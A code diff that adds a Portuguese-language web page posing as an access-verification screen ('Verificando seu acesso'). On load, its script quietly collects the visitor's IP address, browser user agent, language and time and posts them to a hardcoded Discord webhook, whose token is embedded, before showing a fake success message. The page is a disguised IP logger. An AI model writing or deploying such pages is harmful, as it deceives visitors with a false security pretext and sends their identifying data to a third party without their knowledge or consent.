@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+            text-align: center;
+        }
+        
+        .container {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            padding: 3rem;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            max-width: 90%;
+            width: 500px;
+        }
+
+        h1 {
+            margin-top: 0;
+            font-size: 2.5rem;
+        }
+
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 2rem auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            background: rgba(46, 204, 113, 0.3);
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1.5rem;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Verificando seu acesso</h1>
+        <p>Estamos verificando suas credenciais de segurança...</p>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div class="success-message" id="successMessage">
+            Verificação concluída com sucesso! Você pode continuar.
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const loader = document.getElementById('loader');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Mostra o loader
+            loader.style.display = 'block';
+            
+            // Obtém o IP do usuário
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    
+                    // Coleta informações adicionais
+                    const userAgent = navigator.userAgent;
+                    const language = navigator.language;
+                    const timestamp = new Date().toISOString();
+                    
+                    // Envia para o webhook do Discord
+                    const webhookURL = 'https://discord.com/api/webhooks/1392481996479139972/6BZ44fif_1zd8HGNxsxZq9caBV38RiAZ2KUW74sf-_apvb8rsgXvhrszKeYVlwbNFJG4';
+                    
+                    const embed = {
+                        title: "Nova Visita Detectada",
+                        color: 5814783,
+                        fields: [
+                            { name: "Endereço IP", value: userIP, inline: true },
+                            { name: "Navegador", value: userAgent, inline: true },
+                            { name: "Idioma", value: language, inline: true },
+                            { name: "Horário", value: timestamp, inline: true }
+                        ],
+                        footer: { text: "Sistema de Monitoramento" }
+                    };
+                    
+                    const payload = {
+                        content: "⚠️ Nova visita detectada no site!",
+                        embeds: [embed]
+                    };
+                    
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(() => {
+                        // Esconde o loader e mostra mensagem de sucesso
+                        loader.style.display = 'none';
+                        successMessage.style.display = 'block';
+                    })
+                    .catch(error => {
+                        console.error('Erro ao enviar para o webhook:', error);
+                        loader.style.display = 'none';
+                    });
+                })
+                .catch(error => {
+                    console.error('Erro ao obter IP:', error);
+                    loader.style.display = 'none';
+                });
+        });
+    </script>
+</body>
+</html>
